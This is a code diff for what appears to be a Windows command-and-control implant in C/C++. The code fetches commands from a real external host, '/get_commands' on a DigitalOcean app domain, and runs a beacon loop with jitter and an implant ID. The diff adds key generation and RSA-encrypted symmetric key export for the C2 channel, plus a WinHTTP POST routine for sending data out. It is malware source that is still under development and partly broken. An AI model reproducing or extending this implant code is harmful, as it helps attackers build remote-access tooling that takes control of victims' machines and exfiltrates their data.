@@ -78,7 +78,7 @@ char *getsecret()
     return secret;
 }
 
-BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey)
+BCRYPT_KEY_HANDLE newsymkey()
 {
     BCRYPT_ALG_HANDLE ahandle;
     BCRYPT_KEY_HANDLE symkeyhandle;
@@ -92,11 +92,17 @@ BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey)
     char *secret = getsecret();
     BCryptGenerateSymmetricKey(ahandle, &symkeyhandle, NULL, 0, (PUCHAR)secret, 8, 0);
     free(symkeylen);
+    return symkeyhandle;
+}
 
-
+ULONG getkeysize(BCRYPT_KEY_HANDLE symkeyhandle){
     //Get datablob required size
     ULONG blobsize;
     BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,NULL,0,&blobsize,0);
+    return blobsize;
+}
+
+BLOB* getkeytext(BCRYPT_KEY_HANDLE symkeyhandle,ULONG blobsize){
     //Make blob, export key to blob
     BLOB* keyblob=(BLOB*)malloc(blobsize);
     BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,(PUCHAR)keyblob,blobsize,&blobsize,0);
@@ -240,15 +246,95 @@ std::string getTasks(int implant_id)
     std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/get_commands", implant_id);
     return item;
 }
+LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
+{
+    DWORD datalen = strlen(postdata);
+    HINTERNET httpsession = WinHttpOpen(
+        L"GenericAPICaller",
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0);
+    if (httpsession != NULL)
+    {
+        HINTERNET connectsesh = WinHttpConnect(
+            httpsession,
+            servername,
+            INTERNET_DEFAULT_HTTPS_PORT,
+            0);
+        if (connectsesh != NULL)
+        {
+            HINTERNET request = WinHttpOpenRequest(
+                connectsesh,
+                L"POST",
+                subdirectory,
+                NULL,
+                WINHTTP_NO_REFERER,
+                WINHTTP_DEFAULT_ACCEPT_TYPES,
+                WINHTTP_FLAG_SECURE);
+            if (request != NULL)
+            {
+
+
+                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
+                    printf("YOU SET HEADER");
+                }
+
+
+                BOOL idrequest = WinHttpSendRequest(
+                    request,
+                    WINHTTP_NO_ADDITIONAL_HEADERS,
+                    0,
+                    (LPVOID)postdata,
+                    datalen,
+                    datalen,
+                    0);
+                if (idrequest == TRUE)
+                {
+                    BOOL response = WinHttpReceiveResponse(
+                        request,
+                        NULL);
+                    if (response == true)
+                    {
+                        DWORD bytesneeded;
+                        BOOL query = WinHttpQueryDataAvailable(
+                            request,
+                            &bytesneeded);
+                        LPSTR returnbuffer = new char[bytesneeded + 1];
+                        if (query == TRUE)
+                        {
+                            if (returnbuffer)
+                            {
+                                ZeroMemory(returnbuffer, bytesneeded + 1);
+                                BOOL dataread = WinHttpReadData(
+                                    request,
+                                    returnbuffer,
+                                    bytesneeded + 1,
+                                    NULL);
+                                if (dataread == TRUE)
+                                {
+                                    return returnbuffer;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
 
 void runLoop(int implant_id)
 {
     int jitter;
     int i=0;
     BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)serverpublickey,(ULONG)562);
-    BCRYPT_KEY_HANDLE symkey=newsymkey(rsakey);
+    BCRYPT_KEY_HANDLE symkey=newsymkey();
+    ULONG symkeysize=getkeysize(symkey);
+    BLOB* symkeytext=getkeytext(symkey,symkeysize);
+    PUCHAR encbuffer=rsaEncrypt(rsakey,(PUCHAR) symkeytext,symkeysize);
 
-    
     //char* encbuffer=rsaEncrypt(rsakey,);
     //register()
 
@@ -334,6 +420,7 @@ int main(int argc, char *argv[])
 
     //int implant_id = get_id();
     int implant_id=0;
+    
     runLoop(implant_id);
     return 0;
 }
@@ -406,7 +493,7 @@ LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
     }
 }
 
-
+ Code not used */
 LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
 {
     DWORD datalen = strlen(postdata);
@@ -484,4 +571,3 @@ LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *post
         }
     }
 }
- Code not used */
